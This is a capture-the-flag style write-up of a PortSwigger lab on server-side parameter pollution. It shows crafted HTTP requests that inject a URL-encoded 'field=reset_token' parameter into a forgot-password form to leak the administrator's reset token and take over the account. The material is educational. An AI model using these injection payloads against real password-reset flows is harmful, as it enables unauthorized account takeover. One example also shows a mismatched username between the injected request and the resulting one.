# Exploiting server-side parameter pollution in a query string

## Table of Contents

1. [Overview](#overview)
2. [Background](#background)
3. [Enumeration](#enumeration)
4. [Exploitation](#exploitation)
5. [Conclusion](#conclusion)

## Overview

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string), you'll learn: Exploiting server-side parameter pollution in a query string! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★★☆☆☆☆☆

## Background

To solve the lab, log in as the `administrator` and delete `carlos`.

## Enumeration

**Login page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510173908.png)

In here, we can login as an user by entering the username and password field and click the "Log in" button. We can also go to **the "Forgot password?" link to reset an account's password**:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174037.png)

We can try to enter a random username and click the "Submit" button:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174259.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174326.png)

Burp Suite HTTP history:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174342.png)

When we clicked the "Submit" button, it'll send a POST request to `/forgot-password` with parameter `csrf` and `username`.

Now, what if we enter a valid username, like `administrator`?

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174501.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510174511.png)

Hmm... Looks like it'll send an email to the account's email address.

**In the `/forgot-password` page, it also loaded a JavaScript file:**
```html
<script src="/static/js/forgotPassword.js"></script>
```

**`/static/js/forgotPassword.js`:**
```javascript
let forgotPwdReady = (callback) => {
    if (document.readyState !== "loading") callback();
    else document.addEventListener("DOMContentLoaded", callback);
}
[...]
forgotPwdReady(() => {
    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const resetToken = urlParams.get('reset-token');
    if (resetToken)
    {
        window.location.href = `/forgot-password?reset_token=${resetToken}`;
    }
    else
    {
        const forgotPasswordBtn = document.getElementById("forgot-password-btn");
        forgotPasswordBtn.addEventListener("click", displayMsg);
    }
});
```

When the DOM (Document Object Model) has fully loaded, **it'll retrieve our GET parameter `reset-token`'s value**. If that parameter's value exist, it'll redirect us to **`/forgot-password?reset_token=<resetToken>`**.

If we try to send a GET request with an invalid reset token at `/forgot-password?reset_token=<resetToken>`, it'll response "Invalid token":

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510175233.png)

Hmm... I wonder **how the reset token checking works**...

It could be retrieve the token and **validate it with a SQL query**. Or, **using an internal API to validate the token**. Let's try to test the latter.

## Exploitation

Some systems contain internal APIs that aren't directly accessible from the internet. Server-side parameter pollution occurs when a website embeds user input in a server-side request to an internal API without adequate encoding. This means that an attacker may be able to manipulate or inject parameters, which may enable them to, for example:

- Override existing parameters.
- Modify the application behavior.
- Access unauthorized data.

We can test any user input for any kind of parameter pollution. For example, query parameters, form fields, headers, and URL path parameters may all be vulnerable.

In our case, we want to test **the `reset_token` parameter** is whether vulnerable to **server-side parameter pollution** or not.

To test for server-side parameter pollution in the query string, place query syntax characters like `#`, `&`, and `=` in our input and observe how the application responds.

We can try to make an education guess about how our `reset_token` parameter is being parsed.

When we try to reset an account's password, our browser sends the following request:

```http
GET /forgot-password?reset_token=0123456789abcdef
```

To validate the `reset_token`, the server queries an internal API with the following request:

```http
GET /api/resetPassword?reset_token=0123456789abcdef&username=wiener
```

- Truncating query strings

We can use a URL-encoded `#` character to attempt to truncate the server-side request. To help us interpret the response, we could also add a string after the `#` character.

For example, we could modify the query string to the following:

```http
GET /forgot-password?reset_token=0123456789abcdef%23foo
```

The front-end will try to access the following URL:

```http
GET /api/resetPassword?reset_token=0123456789abcdef#foo&username=wiener
```

> Note
>  
> It's essential that we URL-encode the `#` character. Otherwise the front-end application will interpret it as a fragment identifier and it won't be passed to the internal API.

- Injecting invalid parameters

We can use an URL-encoded `&` character to attempt to add a second parameter to the server-side request.

For example, we could modify the query string to the following:

```http
GET /forgot-password?reset_token=0123456789abcdef%26foo=xyz
```

This results in the following server-side request to the internal API:

```http
GET /api/resetPassword?reset_token=0123456789abcdef&foo=xyz&username=wiener
```

- Injecting valid parameters

If we're able to modify the query string, we can then attempt to add a second valid parameter to the server-side request.

For example, if we've identified the `email` parameter, we could add it to the query string as follows:

```http
GET /forgot-password?reset_token=0123456789abcdef%26email=foo
```

This results in the following server-side request to the internal API:

```http
GET /api/resetPassword?reset_token=0123456789abcdef&email=foo&username=wiener
```

- Overriding existing parameters

To confirm whether the application is vulnerable to server-side parameter pollution, we could try to override the original parameter. Do this by injecting a second parameter with the same name.

For example, we could modify the query string to the following:

```http
GET /forgot-password?reset_token=0123456789abcdef%26username=peter
```

This results in the following server-side request to the internal API:

```http
GET /api/resetPassword?reset_token=0123456789abcdef&username=carlos&username=wiener
```

The internal API interprets two `username` parameters. The impact of this depends on how the application processes the second parameter. This varies across different web technologies. For example:

- PHP parses the last parameter only. This would result in a user search for `carlos`.
- ASP.NET combines both parameters. This would result in a user search for `peter,carlos`, which might result in an `Invalid username` error message.
- Node.js / express parses the first parameter only. This would result in a user search for `peter`, giving an unchanged result.

If we're able to override the original parameter, you may be able to conduct an exploit. For example, we could add `name=administrator` to the request. This may enable you to log in as the administrator user.

After some trials and errors, I found that the `reset_token` doesn't have any changes when I did the above testing.

Instead, **the POST request to `/forgot-password` has some changes**.

**Normal response:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510181834.png)

**After truncating query strings via `#`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510181908.png)

Hmm... `Field not specified.`??

That being said, when we send this POST request:

```http
POST /forgot-password HTTP/2

csrf=ggIz6CxBvVugiFQkf34MG3MC6Zcvj8AG&username=foobar%23
```

The server-side request to the internal API might be this:

```http
GET /api/user?username=foobar#&otherparameter=blah
```

That being said, **the `username` parameter is parsed to the internal API**.

Also, by injecting invalid parameters, we can get error `Parameter is not supported.`:

```http
POST /forgot-password HTTP/2

csrf=ggIz6CxBvVugiFQkf34MG3MC6Zcvj8AG&username=foobar%26foo=xyz
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510182346.png)

Which means the internal API interpreted `&foo=xyz` as a separate parameter.

After fumbling around, I found that **the `field` is a parameter name**! This parameter's value may refer to other parameter name.

Let's try `username`:

```http
POST /forgot-password HTTP/2

csrf=ggIz6CxBvVugiFQkf34MG3MC6Zcvj8AG&username=administrator%26field=username
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510183557.png)

Ah ha! I started to understand this! **The `field` in the internal API means return a specific object's attribute (field)'s value!**

In our case, we injected the `field` to be `username` and caused the internal API returned the user's object attribute `username`'s value!

Hmm... Did you recall **the `reset_token` parameter name**?

**What if the internal API return user `administrator`'s reset token??**

```http
POST /forgot-password HTTP/2

csrf=ggIz6CxBvVugiFQkf34MG3MC6Zcvj8AG&username=administrator%26field=reset_token
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510183926.png)

Let's go!!! We got user `administrator`'s reset token (`qb7tt2w2b1ooq4xrlxlpopbwwby0dgb4`)!!

Finally, we can send a GET request to `/forgot-password` with parameter `reset_token=qb7tt2w2b1ooq4xrlxlpopbwwby0dgb4`:

```http
GET /forgot-password?reset_token=qb7tt2w2b1ooq4xrlxlpopbwwby0dgb4 HTTP/2
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184048.png)

Nice! We can now reset `administrator`'s password!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184120.png)

Then login as `administrator`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184138.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184155.png)

We're in! Let's go to the "Admin panel" and delete user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184220.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/API-Testing/API-4/images/Pasted%20image%2020240510184227.png)

## Conclusion

What we've learned:

1. Exploiting server-side parameter pollution in a query string